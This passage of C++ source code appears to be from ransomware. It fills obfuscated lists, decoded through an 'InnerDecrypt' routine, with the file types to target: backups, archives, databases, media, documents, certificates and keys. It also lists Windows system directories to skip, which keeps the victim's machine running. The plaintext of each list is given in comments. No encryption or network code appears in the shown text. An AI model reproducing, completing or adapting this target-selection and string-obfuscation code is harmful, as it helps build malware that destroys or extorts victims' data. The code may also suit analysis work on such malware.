 $db,001,001,002,113,73b,aba,abf,,acp,as4,asd,ashbak,asvx,ate,ati,bac,bak,bak,bak~,bak2,bak3,bakx,bbb,bbz,bck,bckp,bcm,bk1,bk1,bkc,bkf,bkp,bks,blend1,blend2,bm3,bpa,bpb,bpm,bpn,bps,bup,bup,cbk,cbu,ck9,crds,da0,dash,dba,dbk,diy,dna,dov,fbc,fbf,fbk,fbk,fbu,fbw,fh,fhf,flka,flkb,fpsx,ftmb,ful,fza,gb1,gb2,gbp,gho,ghs,icf,ipd,iv2i,jbk,jdc,kb2,lcb,llx,mbk,mbw,mdbackup,mddata,mdinfo,mem,mig,mpb,mv_,nb7,nba,nbak,nbd,nbd,nbf,nbf,nbi,nbk,nbs,nbu,nco,nfb,nfc,npf,nps,nrbak,nrs,nwbak,obk,oeb,old,onepkg,ori,orig,paq,pbb,pbj,qba.tlg,qbb,qbk,qbm,qbmb,qbmd,qbx,qic,qsf,qualsoftcode,qv~,rbc,rbf,rbk,rbs,rdb,rgmb,rmbak,rrr,sbb,sbs,sbu,skb,sn1,sn2,sna,sns,spf,spg,spi,srr,stg,sv$,sv2i,tbk,tdb,tig,tis,tlg,tmr,trn,ttbk,uci,v2i,vbk,vbm,vbox-prev,vpcbackup,vrb,wbb,wbcat,win,win,wjf,wpb,wspak,xlk,yrcbck 
  */
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("CY*Y*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("%x%x%t")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("%x%x%t"))); //original mistake
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("%x%x%C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("%t%t%%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("%+%%*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*t*C*t")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*t*C**")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("t*C*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*t*%+x")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*t+%%Y")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*t+%*Y")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*t+%*K*C*t*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*t+%+*+K")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*t+Y*v")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*t+Y*N")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*t*%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*t*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*t*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*t*,+(")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*t*,%C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*t*,%%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*t*,+K")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*C*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*C+m")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*%*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*%*,+x")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*%*;")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*,%t")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*,%t")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*,*%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*,**")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*,+x")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*,+%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*$*v*(*Y%t")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*$*v*(*Y%C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*;%%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C+x*t")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C+x*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C+x*;")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C+x*(")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C+x+%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C+v+x")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C+v+x")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*%*C*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*%*C+v")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*%*,%N")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*%+C*Y+%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*Y*t%x")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*Y*t+%*K")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*Y*C*t")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*Y*C*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*Y*N+N")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*Y*(*t")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*Y*-+*")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("***C*%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("***C**")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("***C*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("***C*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("***C+v")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("***C++")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("***K")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("***K**")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("***$*,*t")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("***$*,*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("**+x+%+K")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("**+Y*;*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("**+v*$")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("**+m*t")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*+*C%t")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*+*C%C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*+*C+x")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*+*K*-")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*+*K+%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*N*%**")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*N+x*Y")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*N+*%C*N")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*m*C*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*m*Y*%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*,*C%C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*$*%*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*$*$+K")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;*C*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;*C++")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;*Y*C*t*%*,+v+x")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;*Y*Y*t+Y*t")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;*Y*N*(***-")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;*v*;")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;*N*+")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;+x*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;+*v-")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(*C%+")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(*C*t")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(*C*t*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(*C*Y")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(*C*Y")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(*C**")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(*C**")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(*C*N")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(*C*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(*C+%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(*C+v")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(*%*-")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(***C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(***%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(+x**")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(+x+%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(+C*C*t*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(+C+%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*(++*C*t*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*-*C*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*-*v*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*-*$*Y")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*-*(*v+x*,*+")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*-+C*N")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*-+C*N*+")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x*t+t")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x*C*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x*C*m")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+t*C*tC(+Y*$*+")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+t*C*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+t*C*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+t*C*;")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+t*C*;*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+t*C*;*Y")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+t*C+K")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+t*N*%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+t+%**")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+t+v*t*$+%*-**+Y*%*-*Y*v")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+t+*+(")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+C*C*%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+C*C**")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+C*C*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+C*C+%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+C*Y*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+C*+*;*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+C*;*C*t*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+C+C+C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%*C*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%*C+%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%*C+v")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%*,*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%*(%t")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%*(%C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%*(*t")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%*(+%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+x**")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+x*+")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+x*N")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+C+C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+Y*+")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+*CY")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+*%C*N")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y*C*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y*Y*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y*N*+")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y*N+%")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y*$*+")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y*;+C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y+C*(")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y+Y*C*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+v*%*N")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+*%C*N")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+**C*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+**C*;")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+**C*-+KC;+x+C*v+*")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+*+x*%*C*t*%*,+v+x")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+*+C*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("++*C*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("++*C*%*t+Y")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("++*N*(")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("++*N*(")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("++*m**")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+++x*C")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+++%+x*t*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+K*$*,")));
  backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+N+C*%*C*%*,")));
}
void FillDirs() {
  /*
  RECYCLER,Recycle,WINDOWS,$WINDOWS.~WS,$WINDOWS.~BT,Windows.old,tmp,winnt,Application Data,AppData,Program Files(x86),Program Files,temp,thumbs.db,$Recycle.Bin,System Volume Information,Boot,Windows
  */
  directories.push_back(converter.from_bytes(InnerDecrypt("vCYvY%vNY%Y$YvvC")));
  directories.push_back(converter.from_bytes(InnerDecrypt("vC*v*%+N*%*$*v")));
  directories.push_back(converter.from_bytes(InnerDecrypt("v+YNY(YYY-v+v%")));
  directories.push_back(converter.from_bytes(InnerDecrypt("CYv+YNY(YYY-v+v%C(+(v+v%")));
  directories.push_back(converter.from_bytes(InnerDecrypt("CYv+YNY(YYY-v+v%C(+(YCvY")));
  directories.push_back(converter.from_bytes(InnerDecrypt("v+*N*(*Y*-+++%C(*-*$*Y")));
  directories.push_back(converter.from_bytes(InnerDecrypt("+Y*;+x")));
  directories.push_back(converter.from_bytes(InnerDecrypt("++*N*(*(+Y")));
  directories.push_back(converter.from_bytes(InnerDecrypt("Yt+x+x*$*N*%*t+Y*N*-*(CxYY*t+Y*t")));
  directories.push_back(converter.from_bytes(InnerDecrypt("Yt+x+xYY*t+Y*t")));
  directories.push_back(converter.from_bytes(InnerDecrypt("vx+C*-*++C*t*;CxY**N*$*v+%CK+K%K%*CN")));
  directories.push_back(converter.from_bytes(InnerDecrypt("vx+C*-*++C*t*;CxY**N*$*v+%")));
  directories.push_back(converter.from_bytes(InnerDecrypt("+Y*v*;+x")));
  directories.push_back(converter.from_bytes(InnerDecrypt("+Y*K+v*;*C+%C(*Y*C")));
  directories.push_back(converter.from_bytes(InnerDecrypt("CYvC*v*%+N*%*$*vC(YC*N*(")));
  directories.push_back(converter.from_bytes(InnerDecrypt("v%+N+%+Y*v*;Cxv**-*$+v*;*vCxYN*(***-+C*;*t+Y*N*-*(")));
  directories.push_back(converter.from_bytes(InnerDecrypt("YC*-*-+Y")));
  directories.push_back(converter.from_bytes(InnerDecrypt("v+*N*(*Y*-+++%")));
}

void FillMediaExts() {
  /*
 jpg,avi,mpeg,mpg,fla,wmv,swf,djv,djvu,bmp,gif,png,jpeg,tif,tiff,mkv,mov,vdi,aes 
  */
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*m+x*+")));
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*t+**N")));
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;+x*v*+")));
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;+x*+")));
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("***$*t")));
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("++*;+*")));
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%++**")));
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*Y*m+*")));
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*Y*m+*+v")));
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*;+x")));
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*+*N**")));
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x*(*+")));
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*m+x*v*+")));
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y*N**")));
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y*N****")));
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;*,+*")));
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;*-+*")));
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+**Y*N")));
  media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*t*v+%")));
}

void FillArcExts() {
  /*
 tbk,zi,zip,zipx,zix,zip,7z,001,002,bz,bz2,bza,bzip,bzip2,czip,gz,gz2,gza,gzi,gzip,gz,rar,sqx,sqz,srep,tar,lzma,xz,taz,tbz,tbz2,tg,tgz,tlz,tlzma,tsk,tx_,txz,tz,uc2 
  */
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y*C*,")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+m*N")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+m*N+x")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+m*N+x+K")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+m*N+K")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+m*N+x")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("%++m")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("%x%x%t")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("%x%x%C")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C+m")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C+m%C")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C+m*t")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C+m*N+x")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C+m*N+x%C")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*%+m*N+x")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*++m")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*++m%C")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*++m*t")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*++m*N")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*++m*N+x")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*++m")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+C*t+C")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+t+K")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+t+m")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+C*v+x")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y*t+C")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*$+m*;*t")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+K+m")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y*t+m")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y*C+m")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y*C+m%C")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y*+")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y*++m")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y*$+m")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y*$+m*;*t")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y+%*,")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y+Kv-")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y+K+m")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y+m")));
  archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+v*%%C")));
}

void FillScriptsExts() {
  /*
 sql,sqlite,sqlite3,sqlitedb,php,asp,aspx,html,psd,2d,3dc,cad,cmd,bat,java,asp,vbs,asm,php,pas,cpp,MYI,MYD,sqlitedb,ms11(Security copy) 
  */
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+t*$")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+t*$*N+Y*v")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+t*$*N+Y*v%%")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+t*$*N+Y*v*Y*C")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x*K+x")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*t+%+x")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*t+%+x+K")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*K+Y*;*$")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x+%*Y")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("%C*Y")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("%%*Y*%")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*%*t*Y")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*%*;*Y")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*C*t+Y")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*m*t+**t")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*t+%+x")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+**C+%")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*t+%*;")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x*K+x")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x*t+%")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*%+x+x")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("Y;vNYN")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("Y;vNYY")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+t*$*N+Y*v*Y*C")));
  script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;+%%t%tCKv%*v*%+v+C*N+Y+NCx*%*-+x+NCN")));
}

void FillDocExts() {
  /*
  docm,pdf,sxi,otp,odp,wks,xltx,xltm,xlsx,xlsm,xlsb,slk,xlw,xlt,xlm,xlc,dif,stc,sxc,ots,ods,hwp,uot,rtf,ppt,stw,sxw,ott,odt,sti,pps,pot,std,pptm,pptx,potm,potx,odg,otg,sxm,mml,docb,ppam,ppsm,csr,crt,key,doc,pem,dat,kwm,ppsx,txt,hdoc,docx,xls,xlsx,ppt,pptx,sqlite,1cd,cd,csv,mdb,dwg,dbf,cdr,rtf,odt,mdb,sln,max
  */
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*Y*-*%*;")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x*Y**")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+K*N")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*-+Y+x")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*-*Y+x")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("++*,+%")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+K*$+Y+K")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+K*$+Y*;")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+K*$+%+K")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+K*$+%*;")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+K*$+%*C")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%*$*,")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+K*$++")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+K*$+Y")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+K*$*;")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+K*$*%")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*Y*N**")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+Y*%")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+K*%")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*-+Y+%")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*-*Y+%")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*K+++x")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+v*-+Y")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+C+Y**")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x+x+Y")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+Y++")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+K++")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*-+Y+Y")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*-*Y+Y")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+Y*N")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x+x+%")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x*-+Y")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+Y*Y")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x+x+Y*;")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x+x+Y+K")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x*-+Y*;")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x*-+Y+K")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*-*Y*+")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*-+Y*+")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+K*;")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;*;*$")));
